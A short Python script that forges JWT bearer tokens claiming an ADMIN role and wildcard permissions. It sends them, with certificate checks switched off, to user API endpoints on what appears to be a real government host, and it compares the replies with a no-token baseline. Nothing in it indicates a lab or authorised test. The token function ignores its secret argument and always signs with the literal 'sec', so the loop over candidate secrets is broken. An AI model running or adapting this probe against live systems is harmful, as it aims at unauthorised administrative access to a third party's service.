import requests, jwt, time
s = requests.Session()
s.verify = False
import urllib3; urllib3.disable_warnings()
def tok(sec):
    return jwt.encode({"user":{"role":"ADMIN"},"permissions":["*"],"exp":9999999999,"iat":1},"sec",algorithm="HS256")
for url in ["https://epcr.tpf.gov.tw:4004/api/user","https://epcr.tpf.gov.tw:4000/api/user"]:
    for sec in ["WRONGSECRET_x","correcthorsebatterystaple"]:
        r = s.get(url, headers={"Authorization":"Bearer "+tok(sec)}, timeout=15)
        print(url.split(":")[2], "sec=%-25s => %s %dB %r" % (sec[:12], r.status_code, len(r.content), r.text[:60]))
# no-token baseline
r = s.get("https://epcr.tpf.gov.tw:4004/api/user", timeout=15)
print("no-token =>", r.status_code, len(r.content), repr(r.text[:60]))
